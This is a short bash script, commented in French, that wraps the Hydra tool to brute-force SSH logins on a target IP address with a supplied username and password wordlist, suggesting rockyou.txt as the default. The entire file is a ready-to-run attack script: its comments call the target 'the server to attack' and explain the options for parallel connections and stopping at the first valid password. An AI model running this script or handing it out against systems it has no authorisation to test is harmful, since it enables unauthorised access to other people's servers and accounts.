#!/bin/bash

# Vérifier si tous les arguments sont fournis
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <TARGET_IP> <USERNAME> <WORDLIST_PATH>"
    exit 1
fi

# Définir la cible, le nom d'utilisateurice et la wordlist à partir des arguments
TARGET="$1"              # Adresse IP du serveur à attaquer
USERNAME="$2"            # Nom d'utilisateurice à tester pour la connexion SSH
WORDLIST="$3"            # Chemin de la wordlist à utiliser pour l'attaque par force brute // Par défaut : "/usr/share/wordlists/rockyou.txt"

# Exécuter Hydra pour une attaque brute-force SSH
# -l : spécifie le nom d'utilisateurice
# -P : spécifie la wordlist
# -t : définit le nombre de connexions parallèles (ajuster selon les besoins)
# -f : s'arrête après la première réussite

hydra -l "$USERNAME" -P "$WORDLIST" -t 4 -f ssh://"$TARGET"